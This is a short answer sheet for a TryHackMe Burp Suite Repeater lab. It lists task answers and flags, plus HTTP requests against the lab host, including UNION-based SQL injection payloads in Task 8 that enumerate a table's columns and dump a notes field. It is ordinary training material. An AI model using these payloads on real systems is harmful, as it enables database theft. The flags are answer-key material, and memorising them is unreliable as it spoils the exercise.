# THM - Burp Suite: Repeater

<br>

## Task 4

### Task 4.2

> Render

<br>

## Task 6

### Task 6.3

> THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}

<br>

## Task 7

### Task 7.2

```http
GET /products/-1 HTTP/1.1
Host: 10-10-239-63.p.thmlabs.com
```

> THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}

<br>

## Task 8

https://10-10-239-63.p.thmlabs.com/about/2

```http
GET /about/2' HTTP/1.1
Host: 10-10-239-63.p.thmlabs.com
```

```http
GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" HTTP/1.1
Host: 10-10-239-63.p.thmlabs.com
```

### Task 8.7

```http
GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1 HTTP/1.1
Host: 10-10-239-63.p.thmlabs.com
```

> THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}

